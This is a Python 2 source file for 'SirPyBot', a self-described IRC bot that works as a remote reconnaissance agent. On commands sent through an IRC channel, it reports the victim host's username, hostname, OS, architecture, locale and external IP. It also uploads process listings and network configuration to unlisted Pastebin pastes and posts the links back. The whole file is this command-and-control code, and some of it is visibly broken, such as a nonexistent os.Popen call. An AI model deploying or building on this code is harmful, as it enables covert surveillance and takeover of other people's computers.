#!/usr/bin/env python
'''
Name: sirpybot.py
Description: IRC Bot
Author: Lopi
Contributors: b0b (Windows stuffs)
Version: 0.2
'''
# Libraries
import socket # Communicate with irc server
import sys # CLI options
import os # System calls
import platform # System info gathering
import locale # System language
import urllib2 # Used to get external ip address
import argparse # CLI arg parsing
import time # For sleep()
import subprocess # Spawn subprocesses
from pastebin import PastebinAPI

# CLI options
parser = argparse.ArgumentParser()
parser.add_argument('server', help='IRC Server IP Address')
parser.add_argument('port', help='IRC Server Port')
parser.add_argument('channel', help='IRC Server Channel')
parser.add_argument('nick', help='Nickname')
args = parser.parse_args()

# Global variables to configure the bot 
pastebin_api_key = 'INSERT_KEY_HERE'    
server = args.server  # Server
port = args.port    # Port
channel = '#' + args.channel # Channel
botnick = args.nick # Nickname
ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IRC Socket


# Functions are defined below

def banner(): # Displayed when the program starts
  title = 'SirPyBot'
  version = 'Version 0.2'
  contact = 'chris[dot]spehn[at]gmail[dot]com'
  print '\n' + title.center(45)
  print '\n' + version.center(45)
  print '\n' + contact.center(45)

def ping(): # Function to respond to server pings
  ircsock.send('PONG :pingis\n')

def getlogin(): # Function to get user name
  if (str(platform.platform()))[0:3]=="Win": # If user is running Windows, get username from environment variable %USERNAME% instead
    print 'Sending message -- User name: ' + str(os.getenv("USERNAME"))
    sendmsg(channel, 'User name: ' + str(os.getenv("USERNAME")))
  else:
    print 'Sending message -- User name: ' + str(os.getlogin())
    sendmsg(channel, 'User name: ' + str(os.getlogin()))

def sysinfo(): # Function to obtain system information
  print 'Sending system information'
  sendmsg(channel, 'Computer: ' + platform.uname()[1])
  sendmsg(channel, 'OS: ' + platform.platform()) 
  sendmsg(channel, 'Arch: ' + platform.machine())
  sendmsg(channel, 'Language: ' + locale.getdefaultlocale()[0])

def get_external_ip(): # Function to get external ip address
  try:
    ip = urllib2.urlopen('http://automation.whatismyip.com/n09230945.asp').read()
    sendmsg(channel, 'Connecting from ' + ip + ' to serve you master!')

  except urllib2.HTTPError, e:
    print 'There was an HTTP error: ' + e
    sendmsg(channel, 'There was an HTTP error: ' + e)

  except urllib2.URLError, e:
    print 'There was a problem with the URL: ' + e
    sendmsg(channel, 'There was a problem with the URL: ' + e)

def pslist(): # Function to list process names and pids
  x = PastebinAPI()
  if (str(platform.platform()))[0:3]=="Win":
    # TODO: Make this pretty
    paste_code = os.Popen('tasklist').read()
    url = x.paste(pastebin_api_key,
                  paste_code,
                  paste_name = 'tasklist', 
                  paste_private = 'unlisted',
                  paste_expire_date = '10M')
  else:
    p = subprocess.Popen(['ps', 'aux'], shell=False, stdout=subprocess.PIPE)
    p.wait()
    # TODO: Make this pretty
    paste_code = p.stdout.read()
    url = x.paste(pastebin_api_key,
                  paste_code,
                  paste_name = 'ps aux', 
                  paste_private = 'unlisted',
                  paste_expire_date = '10M')
    sendmsg(channel, url)

def ifconfig():
  if (str(platform.platform()))[0:3]=="Win":
    p = subprocess.Popen('ipconfig /all', shell=False, stdout=subprocess.PIPE)
    p.wait()
    paste_code = p.stdout.read()
    x = PastebinAPI()
    url = x.paste(pastebin_api_key,
                  paste_code,
                  paste_name = 'ipconfig', 
                  paste_private = 'unlisted',
                  paste_expire_date = '10M')
    sendmsg(channel, url)
  else:
    p = subprocess.Popen('ifconfig', shell = False, stdout=subprocess.PIPE)
    p.wait()
    paste_code = p.stdout.read()
    x = PastebinAPI()
    url = x.paste(pastebin_api_key,
                  paste_code,
                  paste_name = 'ifconfig', 
                  paste_private = 'unlisted',
                  paste_expire_date = '10M')

    sendmsg(channel, url)

def pwd(): # Print working directory
  sendmsg(channel, os.getcwd())

def sendmsg(chan , msg): # Function to send messages to the channel
  ircsock.send('PRIVMSG '+ chan +' :'+ msg +'\n')

def joinchan(chan): # Function to join channels
  ircsock.send('JOIN '+ chan +'\n')

def hello(): # Function responds to a user that inputs 'Hello BotName'
  ircsock.send('PRIVMSG '+ channel +' :Hello!\n')
          
def connect(): # Connects to the server, finds commands, etc.
  ircsock.connect((server, int(port))) # Connect to the server
  ircsock.send('USER ' + botnick + ' ' + botnick + ' ' + botnick + ' :' + botnick + '\n') # User authentication
  ircsock.send('NICK '+ botnick +'\n') # Assign NICK to the bot
  joinchan(channel) # Join the channel

def main():
  os.system('clear') # Clear the screen
  banner() # Print the banner
  connect() # Connect to the Server
  get_external_ip() # Announces where the bot is connecting from  

  while 1: # WARNING: May cause an infinite loop

    ircmsg = ircsock.recv(2048) # Receive data from the server
    ircmsg = ircmsg.strip('\n\r') # Remove linebreaks
    print(ircmsg) # Print server's messages
  
    if ircmsg.find(':Hello '+ botnick) != -1: # Calls hello() if 'Hello BotName' is found
      hello()

    if ircmsg.find('PING :') != -1: # Respond to server pings
      ping()

    if ircmsg.find(':User '+ botnick) != -1: # Calls getlogin() if 'User BotName' is found
      getlogin()

    if ircmsg.find(':sysinfo '+ botnick) != -1: # Calls sysinfo() if 'sysinfo BotName' is found
      sysinfo()    

    if ircmsg.find(':getip '+ botnick) != -1: # Calls get_external_ip() if 'getip BotName' is found
      get_external_ip()

    if ircmsg.find(':pslist '+ botnick) != -1: # Calls pslist() if 'pslist BotName' is found
      pslist()

    if ircmsg.find(':ifconfig '+ botnick) != -1: # Calls pslist() if 'ifconfig BotName' is found
      ifconfig()

    if ircmsg.find(':pwd '+ botnick) != -1: # Calls pwd() if 'pwd BotName' is found
      pwd()
main()